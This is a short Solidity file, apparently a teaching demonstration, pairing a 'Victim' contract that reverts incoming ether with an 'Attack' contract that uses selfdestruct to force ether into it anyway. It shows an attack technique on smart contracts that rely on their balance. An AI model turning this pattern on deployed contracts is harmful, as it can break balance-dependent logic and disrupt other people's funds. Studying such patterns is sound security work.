pragma solidity 0.5.1;

contract Victim{
    function() external payable {
        revert();
    }

    function getEthBalance() public view returns (uint){
        return address(this).balance;
    }
}

contract Attack {


    function pay() public payable {

    }

    function getEthBalance() public view returns (uint){
        return address(this).balance;
    }

    function kill(address payable victim) public {
        selfdestruct(victim);
    }

}
